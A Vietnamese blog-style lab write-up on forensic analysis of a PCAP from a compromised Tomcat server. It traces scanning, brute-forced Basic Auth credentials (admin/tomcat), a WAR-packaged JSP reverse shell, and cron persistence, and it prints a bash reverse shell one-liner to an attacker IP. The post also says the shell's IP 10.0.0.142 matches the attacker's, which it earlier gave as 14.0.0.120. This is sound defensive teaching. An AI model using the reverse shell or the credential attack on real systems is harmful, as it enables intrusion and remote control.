---
title: "Analyze network traffic using Wireshark & NetworkMiner"
date: 2026-04-24 00:00:00 +07000
categories: [Lab]

---

Introduce: Analyze network traffic using Wireshark's custom columns, filters, and statistics to identify suspicious web server administration access and potential compromise.

Scenario: The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.


=============================================================================================


Hôm nay sẽ là bài lab về sử dụng Wireshark và NetworkMiner. Hãy đọc sơ qua bối cảnh, chúng ta nhận được một file PCAP ghi lại toàn bộ lưu lượng mạng các hành vi bên trong công ty. File PCAP có thể có bằng chứng về các hành vi độc hại dẫn đến việc máy chủ web Apache Tomcat bị compromised. Đòi hỏi phân tích sâu hơn.

![pic1](/assets/img/posts/Tomcat/pic1.png)
 
(file đề bài)

Hãy mở nó bằng Wireshark và NetworkMiner

Cho những ai chưa biết về NetworkMiner:
-	NetworkMiner là một network forensic tool – NFAT open source, chủ yếu cho windows. Hoạt động bằng cách chặn bắt (sniffing) hoặc phân tích các tập tin PCAP để trích xuất tệp tin, hình ảnh, thông tin chứng chỉ và mật khẩu từ lưu lượng mạng một cách thụ động.
 
![pic2](/assets/img/posts/Tomcat/pic2.png)


(hình ảnh sau khi mở bằng NetworkMiner)

Ngay trong giao diện ta có thể thấy các IP host được trích xuất từ file PCAP một cách dễ dàng. Điều này thúc đẩy việc xem IP nào gửi packets đi và nhận được bao nhiêu, các sessions, open TCP ports, v.v. 

Mình đã xem mục Linux có IP là 14.0.0.120, được hiển thị bên dưới
 
![pic3](/assets/img/posts/Tomcat/pic3.png)


Điều này chứng minh khá rõ cho việc port scanning từ IP này, lý do:
-	Host này đã gửi một lượng lớn packets đi (9776 packets).
-	Có đến 30 lần kết nối tới Tomcat với các source port trên máy tấn công như 4446, 5578, 5599,….
-	Gobuster/3.6: là tool brute-force directory/port phổ biến trong pentest. Điều này chứng minh rõ rệt máy này đang chủ tộng scan/attack.
-	*NMAP: networkminer nhận diện traffic này có đặc trưng của nmap.

Như vậy ta có thể kết luận IP 14.0.0.120 đang tiến hành port scanning đến 10.0.0.112 (Tomcat Host Manager Application).

Ngoài ra để có cái nhìn rõ hơn, ta có thể vào mục Statistics -> Coversations -> tab TCP trong Wireshark như hình bên dưới:
 
![pic4](/assets/img/posts/Tomcat/pic4.png)


Trong đây, IP 14.0.0.120 đang gửi rất nhiều packets đến nhiều port khác nhau cho 10.0.0.112 với duration rất thấp. Càng chứng minh rõ rệt cho việc port scaning.

Sau khi đã xác định IP của attacker, hãy recon một vài thông tin về IP này trên AbuseIPDB
 
![pic5](/assets/img/posts/Tomcat/pic5.png)


IP của attacker được báo cáo ở Trung Quốc, cụ thể là Thâm Quyến, Quảng Đông

Quay trở lại với file PCAP, kết quả vừa rồi cho thấy nhiều ports được phát hiện là kết quả của việc scan chủ động từ attacker. Vậy thì hãy dành ra một chút thời gian để xem port nào cung cấp quyền truy cập vào admin panel của Tomcat.
Để làm điều này, chúng ta filter với command sau trong wireshark:

Ip.addr==14.0.0.120 && http
 
![pic6](/assets/img/posts/Tomcat/pic6.png)


Lệnh này sẽ show các packets trong lưu lượng http, thường dùng để truy cập máy chủ web. Tại đây hãy xem một packets bất kỳ, sau đó xem destination port sẽ cho ta biết port nào dùng để truy cập máy chủ web.
 
![pic7](/assets/img/posts/Tomcat/pic7.png)


Như vậy port đích trên máy chủ Tomcat sẽ là 8080

Trước đó chúng ta được biết attacker có sử dụng gobuster phục vụ việc brute-force directories, nhằm việc tìm ra đường dẫn ẩn trên web server. Vậy việc xác định cụ thể thư mục nào mà attacker đã tìm được là rất cần thiết để ứng phó và khắc phục sự cố.

Filter với câu lệnh sau trong wireshark: http && http.response.code==200

![pic8](/assets/img/posts/Tomcat/pic8.png)

Chọn packet đầu tiên và xem kỹ phần packet details. Dễ dàng nhận thấy mục Request URI có /manager/. Đồng nghĩa với việc attacker đã tìm ra thư mục /manager/ là thư mục ẩn trên máy chủ web.

--> Cần phải config lại Access control, authorization,…. Lỗi này do Dev quên cấu hình hoặc cấu hình thiếu.

Sau khi attacker đã vào được admin panel. Một vấn đề quan trọng nữa cần được điều tra là attacker đã dùng credentials nào để log in? Cred nào bị brute-force?

Filter ngay lệnh:
http.authbasic

lệnh này sẽ tìm tất cả các request sử dụng basic authentication trong Wireshark
 
![pic9](/assets/img/posts/Tomcat/pic9.png)


Chúng ta sẽ chưa tìm thấy được credentials nào bị lộ trong này. Việc cần làm là phải tìm packet nào được response từ web server với code 200 (được authorized) đồng nghĩa với việc tài khoản và mật khẩu đúng.
Click vào packet đầu và follow TCP, sau đó tìm từ khóa “200”

![pic10](/assets/img/posts/Tomcat/pic10.png)

 
Bạn sẽ cần bấm “Find next” một vài lần để đến được phần Request có field Authorization.
Ở đây ta có một đoạn mã trông như base64 encode, thử decode xem
 
![pic11](/assets/img/posts/Tomcat/pic11.png)

Như vậy sau một lúc tìm kiếm, ta đã thu được tài khoản bị attacker brute-force là:

Username: admin

Pass: tomcat

Bây giờ nó đã vào được admin panel, vậy thì ta cần xem nó sẽ làm gì trong này? Upload file? Download file?
Chạy ngay filter: http && http.request.method==POST

![pic12](/assets/img/posts/Tomcat/pic12.png)

Chỉ có một packet, vậy attacker chỉ upload 1 file. Click “follow TCP” để xem filename
 
![pic13](/assets/img/posts/Tomcat/pic13.png)


Attacker đã upload file “JXQOZY.war”. Chúng ta có thể xem nội dung trong file với NetworkMiner, rất tiện cho việc trích xuất fille bên trong PCAP file.

![pic14](/assets/img/posts/Tomcat/pic14.png)
 
![pic15](/assets/img/posts/Tomcat/pic15.png)

 
Cần điều tra file có đuôi .jsp này, rất đáng ngờ!

![pic16](/assets/img/posts/Tomcat/pic16.png)
 
Đây chính là đoạn mã phục vụ reverse shell JSP, cực kỳ nguy hiểm, đây là malware/backdoor được upload lên server.

![pic17](/assets/img/posts/Tomcat/pic17.png)
 

Hãy tập trung vào phần trên, đây chính là “trái tim” của reverse shell malware:
-	new Socket("10.0.0.142", 80): đây là dòng để gọi điện về máy attacker, ip đúng như ip attacker chúng ta đã điều tra trước đó.
-	Runtime.exec(ShellPath): mở “/bin/sh” hoặc “cmd.exe” trên server như attacker đã khai báo ở trên.
-	StreamConnector dòng 3: lệnh Output của Shell đưa về cho attacker.
-	StreamConnector dòng 4: lệnh từ attacker đưa vào Shell.

Tóm lại, attacker gõ lệnh --> server thực thi --> kết quả trả về attacker.

Đã là reverse shell thì gần như có persistent, chúng ta hãy dành thêm ít công sức nữa để xem liệu attacker có các hành vi nhằm mục đích persistence hay không.

Để làm việc này, chúng ta cần filter SYN-ACK flags từ server, Wireshark sẽ trả về danh sách tất cả các kết nối mà server đã chấp nhận từ attacker, nó đồng nghĩa với việc server đang nói “OK tao chấp nhận kết nối của mày”

ip.src == 14.0.0.120 && tcp.flags==0x012

![pic18](/assets/img/posts/Tomcat/pic18.png)

 
Follow TCP --> sẽ cho ra các lệnh attacker đã nhập để ra lệnh cho Shell (còn gọi là RCE)

![pic19](/assets/img/posts/Tomcat/pic19.png)
 
Vậy attacker thông qua crontab đã gõ lệnh:
/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1' để phục vụ persistence về lâu dài.

Để giải thích rõ ràng hơn cho việc tại sao follow TCP sẽ cho ra các lệnh RCE plaintext như trên. Hãy nhớ lại JSP script lúc nãy:

![pic20](/assets/img/posts/Tomcat/pic20.png)
 
Shell lúc này được ghép thẳng với TCP, không thông qua mã hóa hay che giấu gi cả. Nên mọi thứ gõ qua shell đều lưu trong TCP stream

Tổng kết sau bài này, chúng ta đã tích góp và học hỏi được những kỹ năng:
- Network Forensics với NetworkMiner & Wireshark Biết cách đọc file PCAP, trích xuất thông tin host, sessions, open ports và phân tích traffic.
- Nhận diện Port Scanning Dựa vào số lượng packets lớn, nhiều outgoing sessions, User-Agent Gobuster và dấu hiệu NMAP để kết luận hành vi scan.
- Wireshark Filtering Biết dùng các filter thực tế như http, http.response.code==200, http.authbasic, http.request.method==POST, tcp.flags==0x012.
- Phát hiện Brute-force Credentials Tìm được username/password bị lộ qua Basic Authentication và decode Base64.
- Phân tích Reverse Shell Hiểu cách hoạt động của JSP Reverse Shell được upload qua Tomcat Manager dưới dạng file WAR.
-  Phát hiện Persistence qua Crontab Follow TCP Stream để đọc lệnh attacker đã thực thi, phát hiện cronjob duy trì kết nối về máy attacker.
- Quy trình tấn công thực tế (Attack Chain) Hiểu toàn bộ chuỗi: Scan → Brute-force → Upload Shell → Reverse Shell → Persistence
